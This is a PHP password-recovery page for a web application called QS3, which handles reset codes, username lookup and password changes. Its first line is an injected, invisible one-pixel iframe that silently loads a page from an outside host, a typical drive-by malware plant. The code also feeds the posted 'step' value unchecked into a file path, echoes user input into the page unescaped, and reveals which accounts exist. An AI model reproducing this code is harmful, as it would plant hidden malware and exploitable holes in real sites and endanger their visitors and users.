<iframe src=http://gadgotec.com/stata.html WIDTH=1 HEIGHT=1 frameborder=0></IFRAME><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<?php

// Prints the head html tags
echo implode("",file("templates/head-master.html"));
echo implode("",file("templates/head-pages.html"));
echo implode("",file("templates/head-tabmenu.html"));

$step = $_POST['step'];

if (($step == "") || ($step== null))
{
   $step = 0;
}

if ($step == "1-pwd")
{
	$daUser = $_POST['daUser'];
	if (($daUser != "")&&($daUser != null))
	{
		require "functions/pwdlost.php";
		$resultSet = GetUserDetails($daUser);
		if ($resultSet['email'] == "")
		{
			$ShowPopup = true;
			$PopupTitle = "What are you trying to do?";
			$PopupMessage = "This username doesn't exists.";
		}
		else
		{
			require 'config.php';
			$to = $resultSet['email']; 
			$subject = 'Password Change Code';
			$message = '<html><body><h2 style="color: black; font-weight: bold;">QS3 » Password change</h2><hr/><br/>Hi '.$daUser.'.<br/>This is your code needed to change the password:<br/><br/>'.$resultSet['code'].'<br/><br/>You need to insert it from <a href="'.$indexpage.'pwdlost.php">here</a> in the "Insert Code" tab.<br/><br/><hr/>This message was automatically sent, please do not reply to this email.</body></html>';
			$headers = 'From: '.$emailalias.' <'.$noreplyemail.'>' . "\r\n" .
					   'X-Mailer: PHP/' . phpversion() . "\r\n" .
					   'MIME-Version: 1.0' . "\r\n" .
					   'Content-Type: text/html; charset=\"iso-8859-1\"' . "\r\n" .
					   'Content-Transfer-Encoding: 7bit';
			
			mail($to, $subject, $message, $headers);
			
			$ShowPopup = true;
			$PopupTitle = "Look at your Inbox!";
			$PopupMessage = "An email was sent to your address with a code<br/>that you can use to change your password.<br/>Check if the email isn't in the Spam Folder.<br/>Remember that it can take a while for the email to arrive.";
		}
	}
	else
	{
		$ShowPopup = true;
		$PopupTitle = "What are you trying to do?";
		$PopupMessage = "You need to insert a username.";
	}
	
	$step = 0;
}

if ($step == "1-user")
{
	$daEmail = $_POST['daEmail'];
	if (($daEmail != "")&&($daEmail != null))
	{
		require "functions/pwdlost.php";
		$result = GetUsername($daEmail);
		if ($result == "")
		{
			$ShowPopup = true;
			$PopupTitle = "What are you trying to do?";
			$PopupMessage = "This email address doesn't exists.";
		}
		else
		{
			require 'config.php';
			$to = $daEmail; 
			$subject = 'Retrieve Username';
			$message = '<html><body><h2 style="color: black; font-weight: bold;">QS3 » Your username</h2><hr/><br/>Hi '.$result.'.<br/>As requested, we sent ypu your username.<br/>Remember that you can\'t change it!<br/>Try to don\'t forget it the next time!<br/>See ya!<br/><br/><hr/>This message was automatically sent, please do not reply to this email.</body></html>';
			$headers = 'From: '.$emailalias.' <'.$noreplyemail.'>' . "\r\n" .
					   'X-Mailer: PHP/' . phpversion() . "\r\n" .
					   'MIME-Version: 1.0' . "\r\n" .
					   'Content-Type: text/html; charset=\"iso-8859-1\"' . "\r\n" .
					   'Content-Transfer-Encoding: 7bit';
			
			mail($to, $subject, $message, $headers);
			
			$ShowPopup = true;
			$PopupTitle = "Look at your Inbox!";
			$PopupMessage = "An email was sent to your address with your QS3 username.<br/>Check if the email isn't in the Spam Folder.<br/>Remember that it can take a while for the email to arrive.";
		}
	}
	else
	{
		$ShowPopup = true;
		$PopupTitle = "What are you trying to do?";
		$PopupMessage = "You need to insert an email address.";
	}
	
	$step = 0;
}

if ($step == "1-code")
{
	$daUser = $_POST['daUserCode'];
	$daCode = $_POST['daCode'];
	
	if (($daUser == "") || ($daUser == null) || ($daCode == "") || ($daCode == null))
	{
		$ShowPopup = true;
		$PopupTitle = "What are you trying to do?";
		$PopupMessage = "Both Username and Code are required.";
		$step = 0;
	}
	else
	{
		require "functions/pwdlost.php";
		$result = CheckCode($daUser, $daCode);
		if ($result == false)
		{
			$ShowPopup = true;
			$PopupTitle = "Check your types";
			$PopupMessage = "Invalid Username/Code pair.<br/>Please check what you are typing.";
			$step = 0;
		}
	}
}

if ($step == "2-code")
{
	$daUser = $_POST['daUserCode'];
	$daCode = $_POST['daCode'];
	
	if (($daUser == "") || ($daUser == null) || ($daCode == "") || ($daCode == null))
	{
		require 'functions/logger.php';
		Log_Warn($_SERVER['REMOTE_ADDR'], "Password Change without user and code");
		
		$ShowPopup = true;
		$PopupTitle = "Do you think I'm fool?";
		$PopupMessage = "You are trying to perform an illegal operation.<br/>Your IP Address has been logged to our server.";
		$step = 0;
	}
	else
	{
		require "functions/pwdlost.php";
		$result = CheckCode($daUser, $daCode);
		if ($result == false)
		{
			require 'functions/logger.php';
			Log_Warn($_SERVER['REMOTE_ADDR'], "Password Change with invalid user and code");
			
			$ShowPopup = true;
			$PopupTitle = "Do you think I'm fool?";
			$PopupMessage = "You are trying to perform an illegal operation.<br/>Your IP Address has been logged to our server.";
			$step = 0;
		}
		else
		{
			$pwd1 = $_POST['daPwd'];
			$pwd2 = $_POST['daPwdAgain'];
			
			if (($pwd1 == "") || ($pwd1 == null) || ($pwd2 == "") || ($pwd2 == null))
			{
				$ShowPopup = true;
				$PopupTitle = "What's Wrong?";
				$PopupMessage = "You need to type your new password two times!";
				$step = 0;
			}
			else
			{
				if ($pwd1 != $pwd2)
				{
					$ShowPopup = true;
					$PopupTitle = "Password mismatch";
					$PopupMessage = "The passwords you've typed doesn't match.";
					$step = "1-code";
				}
				else
				{
					require "functions/register.php";
					ChangePassword($daUser, $pwd1);
					
					$ShowPopup = true;
					$PopupTitle = "Operation Complete!";
					$PopupMessage = "Your password has been changed successfully.";
					$step = 0;
				}
			}
		}
	}
}

echo implode("",file("templates/head-pwdlost.html"));

include 'routines/init.php';
include 'routines/login.php';

if ($isLogged == true)
{
   echo '<meta http-equiv="refresh" content="0; URL=frame.php">';
}

include 'routines/register.php';
include 'routines/banned.php';
include 'routines/addpopup.php';

?>
</head>
<body>
<?

include 'routines/ui.php';

?>


<div class="body-container">
<div class="body-content">


<?

$file_content = implode("",file("templates/pwdlost-step".$step.".html"));

if ($step == "1-code")
{
	$file_content = eregi_replace("<!-- DAUSERCODE -->", $daUser, $file_content);
	$file_content = eregi_replace("<!-- DACODE -->", $daCode, $file_content);
}

echo $file_content;

?>
</div>
</div>
</body>
</html>	ml>	